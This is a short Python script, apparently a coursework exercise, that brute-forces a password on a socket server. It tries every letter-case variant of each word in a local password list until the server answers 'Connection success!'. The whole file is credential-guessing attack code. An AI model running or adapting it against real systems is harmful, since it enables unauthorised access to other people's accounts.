import socket
import sys
import itertools
import string


class Connect:
    def __init__(self, ip, pt):
        self.address = (ip, int(pt))
        self.items = string.ascii_letters + string.digits
        self.dict_list = get_dict()

    def open_socket(self):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)
            passwords = self.gen_password()
            for password in passwords:
                client_socket.send(password.encode())
                response = client_socket.recv(1024).decode()
                if response == 'Connection success!':
                    #  print('Found!')
                    print(password)
                    break
                if response == 'Too many attempts':
                    print('Too many attempts!')
                    break

    def gen_password(self):
        for item in self.dict_list:
            iterations = map(''.join, itertools.product(
                             *zip(item.upper().strip('\n'), item.lower().strip('\n'))))
            for i in iterations:
                yield i


def get_dict():
    file_path = ('D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker'
                 '\\Smarter, dictionary-based brute force\\passwords.txt')
    with open(file_path, 'r') as pass_file:
        lines = pass_file.readlines()
        for line in lines:
            yield line


def main():
    args = sys.argv
    hostname = args[1]
    port = args[2]
    Connect(hostname, port).open_socket()


if __name__ == '__main__':
    main()

